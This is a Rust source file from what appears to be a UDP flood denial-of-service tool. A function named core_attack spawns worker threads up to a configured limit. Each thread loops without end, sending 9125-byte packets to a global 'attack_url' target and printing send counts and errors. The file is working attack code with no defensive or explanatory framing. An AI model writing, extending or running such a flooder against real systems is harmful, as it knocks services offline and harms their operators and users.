use std::net::UdpSocket;
use std::thread;

use crate::extra_fn::{add_start, time_function};
use crate::ram_manger::{SAFE_PUB_VAR, UNSAFE_PUB_VAR};

pub fn core_attack(result: UdpSocket) {
    if let Ok(threads) = SAFE_PUB_VAR.lock() {
        if threads.thread_on + 1.0 < threads.threads_allowed {
            add_start(threads);
            thread::spawn(move || {
                main_code(result);
            });
        } else {
            time_function();
        }
    }
}


fn main_code(result: UdpSocket) {
    loop {
        unsafe {
            let error_data = result.send_to(&[0; 9125], &UNSAFE_PUB_VAR.attack_url);
            match error_data {
                Ok(data) => {
                    UNSAFE_PUB_VAR.amount_sent += 1.0;
                    println!(
                        "Threads on {},\n UDP Connected,\n Request sent per 10 mil {}, sent mb of data: {}",
                        UNSAFE_PUB_VAR.threads_on,
                        UNSAFE_PUB_VAR.amount_sent,
                        data
                    );
                }
                Err(data) => {
                    println!(
                        "Threads on {}, Status ERROR {}\n  Request sent per 10 mil {}",
                        UNSAFE_PUB_VAR.threads_on,
                        data,
                        UNSAFE_PUB_VAR.amount_sent,
                    );
                }
            }
        }
    }
}